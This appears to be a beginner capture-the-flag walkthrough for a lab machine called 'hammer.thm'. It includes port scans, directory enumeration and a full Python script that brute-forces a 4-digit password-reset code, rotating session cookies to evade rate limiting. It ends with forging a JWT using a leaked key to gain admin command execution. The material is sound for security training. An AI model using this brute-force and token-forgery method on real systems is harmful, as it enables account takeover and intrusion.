---
title: Example CTF Walkthrough
date: 2024-03-15
author: Mian Al Ruhanyat
tags: [ctf, beginner, walkthrough]
---

# Initial Footprint

```sh
sudo nmap -sC -sV -p- hammer.thm -oN initial_portscan

Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 67:c3:bd:e3:18:74:80:db:41:24:21:49:28:03:74:76 (RSA)
|   256 da:71:8e:d5:34:61:9c:d2:01:54:71:ba:83:f3:30:42 (ECDSA)
|_  256 6b:eb:87:bc:f3:a7:9d:25:88:22:b2:02:60:d5:47:12 (ED25519)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

- There are 2 ports are open ssh and http on an irregular port 

### Trying specific port scan

```sh
sudo nmap -p22,1337 -A hammer.thm -oN Specific_portscan

PORT     STATE SERVICE VERSION  
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   3072 67:c3:bd:e3:18:74:80:db:41:24:21:49:28:03:74:76 (RSA)  
|   256 da:71:8e:d5:34:61:9c:d2:01:54:71:ba:83:f3:30:42 (ECDSA)  
|_  256 6b:eb:87:bc:f3:a7:9d:25:88:22:b2:02:60:d5:47:12 (ED25519)  
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))  
|_http-server-header: Apache/2.4.41 (Ubuntu)  
|_http-title: Login  
| http-cookie-flags:    
|   /:    
|     PHPSESSID:    
|_      httponly flag not set  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running: Linux 4.X  
OS CPE: cpe:/o:linux:linux_kernel:4.15  
OS details: Linux 4.15  
Network Distance: 2 hops  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



# Intercepting Web Request

- As I don't have any email and password lets try with the forget password and try to intercept the request

![](https://cdn.vectorstock.com/i/1000v/72/80/hammer-cartoon-icon-isolated-vector-32127280.jpg)

- As I was hovering into the devtool and found an interesting Clue there about the directory convention

![](Photos/ea3514874d0ac2e63af7a9e573a1899f_MD5.jpeg)

- Its directing that the directory naming convention starts with  `hmr_DIRECTORY_NAME `
- Lets try some directory busting 

### Directory Enumeration
```sh
feroxbuster -u 'http://hammer.thm:1337' -w /usr/share/wordlists/dirb/big.txt
```

- Lets edit the `big.txt` file and add `hmr_`  prefix before every word

```sh
cp /usr/share/wordlists/dirb/big.txt .\nsed 's/^/hmr_/' big.txt > hmr_big.txt
```

- This will copy the big.txt file from usr/share to the current file and add `hmr_`  word infront of every word and save the file as hmr_big.txt

```sh
feroxbuster -u 'http://hammer.thm:1337' -w hmr_big.txt
```

**I found very useful and juicy directories**

```sh
http://hammer.thm:1337/hmr_css/bootstrap.min.css
http://hammer.thm:1337/reset_password.php
http://hammer.thm:1337/
http://hammer.thm:1337/hmr_css
http://hammer.thm:1337/hmr_css/
http://hammer.thm:1337/hmr_images
http://hammer.thm:1337/hmr_images/
http://hammer.thm:1337/hmr_js
http://hammer.thm:1337/hmr_js/
http://hammer.thm:1337/hmr_images/hammer.webp
http://hammer.thm:1337/hmr_js/jquery-3.6.0.min.js
http://hammer.thm:1337/hmr_logs
http://hammer.thm:1337/hmr_logs/
http://hammer.thm:1337/hmr_logs/error.logs

```

- Here `http://hammer.thm:1337/hmr_logs/error.logs` this seems very unusual

![](Photos/2948991059797f35c64f0305b85625b6_MD5.jpeg)

- This is leaking an email address which is `tester@hammer.thm`

### Checking and verifying the Credential

![](Photos/384a3569bfa573b18c8615856afde442_MD5.jpeg)

- I tried to intercept the request 

![](Photos/7931183bdb389ea9cf717f2257e87088_MD5.jpeg)

- There is a problem here , they put some rate limiting here.
- It means if we try to bruteforce it we can't do that after sometime 
- Lets see if we can bypass the rate limit or not , I don't know how bypass it lets search

**Lets try to send the request without the cookie**

![](Photos/39fc2f04cd46bef099492c4a33a93f0f_MD5.jpeg)

- Its giving us another cookie 
- And the rate limit is getting increased 9

- Now lets use a script which will try every cookies its getting and put it to the place and check if that cookie works or not

```python
import subprocess

def get_phpsessid():
    # Request Password Reset and retrieve the PHPSESSID cookie
    reset_command = [
        "curl", "-X", "POST", "http://hammer.thm:1337/reset_password.php",
        "-d", "email=tester%40hammer.thm",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-v"
    ]

    # Execute the curl command and capture the output
    response = subprocess.run(reset_command, capture_output=True, text=True)

    # Extract PHPSESSID from the response
    phpsessid = None
    for line in response.stderr.splitlines():
        if "Set-Cookie: PHPSESSID=" in line:
            phpsessid = line.split("PHPSESSID=")[1].split(";")[0]
            break

    return phpsessid

def submit_recovery_code(phpsessid, recovery_code):
    # Submit Recovery Code using the retrieved PHPSESSID
    recovery_command = [
        "curl", "-X", "POST", "http://hammer.thm:1337/reset_password.php",
        "-d", f"recovery_code={recovery_code}&s=180",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", f"Cookie: PHPSESSID={phpsessid}",
        "--silent"
    ]

    # Execute the curl command for recovery code submission
    response_recovery = subprocess.run(recovery_command, capture_output=True, text=True)
    return response_recovery.stdout

def main():
    phpsessid = get_phpsessid()
    if not phpsessid:
        print("Failed to retrieve initial PHPSESSID. Exiting...")
        return
    
    for i in range(10000):
        recovery_code = f"{i:04d}"  # Format the recovery code as a 4-digit string

        if i % 7 == 0:  # Every 7th request, get a new PHPSESSID
            phpsessid = get_phpsessid()
            if not phpsessid:
                print(f"Failed to retrieve PHPSESSID at attempt {i}. Retrying...")
                continue
        
        response_text = submit_recovery_code(phpsessid, recovery_code)
        word_count = len(response_text.split())

        if word_count != 148:
            print(f"Success! Recovery Code: {recovery_code}")
            print(f"PHPSESSID: {phpsessid}")
            print(f"Response Text: {response_text}")
            break

if __name__ == "__main__":
    main()

```

- This script will work I guess

![](Photos/9d66603f8ceb98bf45ca29fcc56a59fd_MD5.jpeg)

- Lets try with this cookie I got `lrru84kv9dr2cisdunugik4njb`
- And its successfully bypass the otp machanism

![](Photos/7e194ed31a0e9d19f2ada8fcdd5dfd06_MD5.jpeg)

- After resetting the password I successfully logged in to their site and got the first flag
![](Photos/d084c0d238f4544a1098fac5a0b9c68b_MD5.jpeg)

- But there is a problem which is that I'm getting logged out by the system in every workdone
- Lets try to figure it out in the burpsuite

![](Photos/dcafea07f37baf372ba05f2bddf80ce8_MD5.jpeg)

- Here we can submit commands and can have the view but we can't use every linux command here so we need to bypass that

![](Photos/24fcdde5192f8e1929bdd5bd46fca66d_MD5.jpeg)

- If we type some other commands its giving us permission error

### Getting RCE
- Lets dive into the json part and check some stuff

```sh
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM4NzgwOTQwLCJleHAiOjE3Mzg3ODQ1NDAsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.UxCu6KA1agRdhPIpN2qnTwpXbKP1S7WTIkuMq5eoBgM
```

- This is the token
- Lets try to see the details in the jwt.io

![](Photos/760e358dd7d5071d76c4ed5f14ad7155_MD5.jpeg)

![](Photos/97ecb3a18bfda5a8e78ef6dc6d86e1d2_MD5.jpeg)

- Its requiring a key and if you can remember we got a key while using `ls` command which is `188ade1.key`
- Lets see if we can use it as a directory or not
![](Photos/ad78cca902f9c99da90b80341ac28133_MD5.jpeg)

- The key has been successfully downloaded

```sh
cat 188ade1.key         
56058354efb3daa97ebab00fabd7a7d7
```

- Lets try to use it as secret key for the jwt token

![](Photos/799a30bfbf2787ef8051a76fbc9ae7fa_MD5.jpeg)

- Here I used the key 
- Changed to user to admin
- and change the file directory to the key file

![](Photos/06f86da43a371f627022a1843d0f0b51_MD5.jpeg)

- After changing the token I have successfully done  first Remote Code Execution by using JWT token manipulation


![](Photos/8beb1abff17ccfb5edcb4d041cda21f5_MD5.jpeg)

**and We got our User flag!**







